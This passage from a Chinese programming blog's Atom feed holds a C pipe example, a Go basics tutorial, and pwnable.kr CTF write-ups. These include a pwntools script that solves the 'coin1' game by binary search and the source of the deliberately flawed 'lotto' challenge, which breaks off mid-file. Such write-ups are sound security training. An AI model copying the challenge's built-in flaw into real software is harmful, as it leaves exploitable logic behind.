class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buffer2[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">char</span> buffer[] = <span class="string">&quot;Let&#x27;s study pipe!&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">pid_t</span> fpid;</span><br><span class="line">        pipe(fd);</span><br><span class="line">        fpid = fork();</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d \n&quot;, fd[0], fd[1]);</span></span><br><span class="line">        <span class="keyword">if</span>(fpid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fpid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//父进程 向管道中写入数据</span></span><br><span class="line">                close(fd[<span class="number">0</span>]);</span><br><span class="line">                write(fd[<span class="number">1</span>], buffer, <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;father process input buffer in pipe success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fpid == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//子进程 从管道中读出数据</span></span><br><span class="line">                close(fd[<span class="number">1</span>]);</span><br><span class="line">                read(fd[<span class="number">0</span>], buffer2, <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;son process output buffer in pipe success!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;the buffer in pipe is %s\n&quot;</span>, buffer2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的作用位父进程将buffer字符串数据写入管道中，子进程从管道中读入数据到新数组buffer2中</p><p>编译输出后</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210124180113099.png" alt="image-20210124180113099"></p><h4 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h4><p>三种缓冲</p><p>全缓冲，行缓冲，不缓冲</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;read函数&quot;&gt;&lt;a href=&quot;#read函数&quot; class=&quot;headerlink&quot; title=&quot;read函数&quot;&gt;&lt;/a&gt;read函数&lt;/h4&gt;&lt;p&gt;从文件描述符指向的管道口读入指定字节的字符串到指定的数组中&lt;/p&gt;
&lt;h4 id=&quot;write函数&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>go语言学习1（变量类型与声明方式，循环）</title>
    <link href="http://example.com/2021/01/30/go/GoStudy-1/"/>
    <id>http://example.com/2021/01/30/go/GoStudy-1/</id>
    <published>2021-01-30T14:51:32.538Z</published>
    <updated>2021-02-05T06:27:45.364Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>xxx代表文件的绝对路径</p><ol><li><p>只运行不编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run xxx</span><br></pre></td></tr></table></figure></li><li><p>编译文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build xxx</span><br></pre></td></tr></table></figure></li><li><p>生成工程项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go install</span><br></pre></td></tr></table></figure><h3 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h3></li><li><p>go语言中每一个工程项目都需要有一个main包，这个包中的main函数是程序的入口点</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br></pre></td></tr></table></figure></li><li><p>go语言中函数的花括号的前括号不能单独一行</p><p>✔</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>❌</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> </span><br><span class="line">  &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>go语言中声明的变量必须使用，否则报错</p></li></ol><p><a href="https://medium.com/%E4%BC%81%E9%B5%9D%E4%B9%9F%E6%87%82%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88/golang-goroot-gopath-go-modules-%E4%B8%89%E8%80%85%E7%9A%84%E9%97%9C%E4%BF%82%E4%BB%8B%E7%B4%B9-d17481d7a655">GOPATH,GOROOT的关系</a></p><h3 id="变量（常量）的声明和赋值"><a href="#变量（常量）的声明和赋值" class="headerlink" title="变量（常量）的声明和赋值"></a>变量（常量）的声明和赋值</h3><ol><li>标准声明（先声明在赋值）<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> variable_name <span class="keyword">int</span> <span class="comment">//variable_type</span></span><br><span class="line">variable_name = <span class="number">10</span></span><br></pre></td></tr></table></figure></li><li>简化声明，自动推导类型<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable_name := <span class="number">10</span></span><br></pre></td></tr></table></figure></li><li>多重声明<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//相同类型</span></span><br><span class="line"><span class="keyword">var</span> a, b, c <span class="keyword">int</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不同类型先声明后赋值 </span></span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">    a <span class="keyword">int</span></span><br><span class="line">    b <span class="keyword">float32</span></span><br><span class="line">)</span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">1.1</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明时赋值</span></span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">    a <span class="keyword">int</span> = <span class="number">10</span></span><br><span class="line">    b <span class="keyword">float32</span> = <span class="number">1.1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简化写法</span></span><br><span class="line"><span class="keyword">var</span> a, b = <span class="number">1</span>, <span class="number">1.1</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自动推导类型</span></span><br><span class="line">a, b, c := <span class="number">1</span>, <span class="number">1.1</span>, <span class="string">&quot;Tom&quot;</span></span><br></pre></td></tr></table></figure><h3 id="匿名变量"><a href="#匿名变量" class="headerlink" title="匿名变量"></a>匿名变量</h3>go语言中存在匿名变量，用下划线表示，多用于接受函数返回值时使用，例子<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">anon_var</span><span class="params">()</span> <span class="params">(a, b, c <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">a, _, c := anon_var()</span><br><span class="line">fmt.Println(a, c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>上面代码anon_var函数返回三个值，但是我只想接收第一个和第三个，就是用匿名变量来忽略第二个返回值</li></ol><h3 id="iota枚举"><a href="#iota枚举" class="headerlink" title="iota枚举"></a>iota枚举</h3><p>iota是go语言中的常量计数器，只能作用于常量const，例子如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">a1 = <span class="literal">iota</span></span><br><span class="line">a2 = <span class="literal">iota</span></span><br><span class="line">a3 = <span class="literal">iota</span></span><br><span class="line">    )</span><br><span class="line">fmt.Println(a1, a2, a3)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130232401963.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简化写法</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">a1 = <span class="literal">iota</span></span><br><span class="line">a2 </span><br><span class="line">a3 </span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>go语言中循环只有一种方式，for(range算迭代的话)，下面贴使用方法</p><ol><li><p>不加任何条件：无线循环，除非使用break跳出循环</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;fish&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>普通使用方法：与c语言格式类似</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 与while循环格式类似的写法</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        sum := <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> ; sum &lt;= <span class="number">10</span>; &#123;</span><br><span class="line">                sum += sum</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(sum)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这样写也可以，更像 While 语句形式</span></span><br><span class="line">        <span class="keyword">for</span> sum &lt;= <span class="number">10</span>&#123;</span><br><span class="line">                sum += sum</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>与range一起使用</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//i代表下表，data代表数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">str := <span class="string">&quot;Hello Go&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, data := <span class="keyword">range</span> str &#123;</span><br><span class="line">fmt.Println(i, data)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h3&gt;&lt;p&gt;xxx代表文件的绝对路径&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;只运行不编译&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    <category term="go" scheme="http://example.com/categories/go/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr coin1</title>
    <link href="http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-coin1/"/>
    <id>http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-coin1/</id>
    <published>2021-01-30T14:34:13.394Z</published>
    <updated>2021-02-08T05:12:41.937Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130223550632.png"></p><p>nc连上去看看</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130223653659.png"></p><p>一个找假硬币游戏，大概意思为：</p><p>N是硬币个数，C是输入次数，输入相应的硬币下标会给你硬币的重量（图中输入0代表第一个硬币，10是一个真硬币的重量，输入0,1返回20，代表两个真硬币的重量）</p><p>当次数用完时，需要输入假硬币对应的下标，</p><p>整理完过后就是一个题目考察我们的二分查找能力，就是写代码能力，但是这个代码我调试了一会儿。。（太菜了）😔</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>脚本里面用到了正则表达式来提取字符串中的数字，参考了这篇文章（<a href="https://www.codenong.com/10365225/">链接</a>）</p><p>因为链接的端口只开放一分钟，我这儿网速有限，就在pwnable.kr的服务器上去运行代码了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MakeFlat</span>(<span class="params">low, high</span>):</span></span><br><span class="line">    Flat = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(low, mid):</span><br><span class="line">        Flat += str(i) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="comment">#log.info(&#x27;[&#x27;+Flat+&#x27;]&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> Flat</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BinarySearch</span>(<span class="params">n, c</span>):</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = n</span><br><span class="line">    correct = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(c):</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        flat = MakeFlat(low, high)</span><br><span class="line">        sh.sendline(flat)</span><br><span class="line">        p = sh.recv()</span><br><span class="line">        <span class="comment">#log.success(p)</span></span><br><span class="line">        <span class="keyword">if</span> int(p) == <span class="number">9</span>:</span><br><span class="line">            correct = flat</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> int(p) &lt; (mid - low) * <span class="number">10</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">elif</span> int(p) == (mid - low) * <span class="number">10</span>:</span><br><span class="line">            low = mid</span><br><span class="line">        correct = str(high - <span class="number">1</span>)</span><br><span class="line">    log.success(<span class="string">&#x27;correct index: &#x27;</span> + correct)</span><br><span class="line">    sh.sendline(correct)</span><br><span class="line">    log.success(sh.recv())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">N_C</span>():</span></span><br><span class="line">    <span class="comment">#sleep(3)</span></span><br><span class="line">    Flat = sh.recv()</span><br><span class="line">    log.info(Flat)</span><br><span class="line">    ListOfNaC = map(int, re.findall(<span class="string">&#x27;\d+&#x27;</span>, Flat))</span><br><span class="line">    <span class="keyword">return</span> ListOfNaC</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;\t- Ready? starting in 3 sec... -\n\t\n&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        _list = N_C()</span><br><span class="line">        BinarySearch(_list[<span class="number">0</span>], _list[<span class="number">1</span>])</span><br><span class="line">    log.success(sh.recv())</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130224855930.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130223550632.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;nc连上去看看&lt;/p&gt;
&lt;p&gt;&lt;img s</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr lotto</title>
    <link href="http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-lotto/"/>
    <id>http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-lotto/</id>
    <published>2021-01-30T14:08:09.028Z</published>
    <updated>2021-02-08T05:13:07.401Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130221133246.png"></p><p>利用scp命令从服务器下载源码到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 -r lotto@pwnable.kr: &#x2F;home&#x2F;lotto&#x2F; &#x2F;home&#x2F;fish</span><br></pre></td></tr></table></figure><p>程序源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// win!</span></span><br><span class="line"><span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span 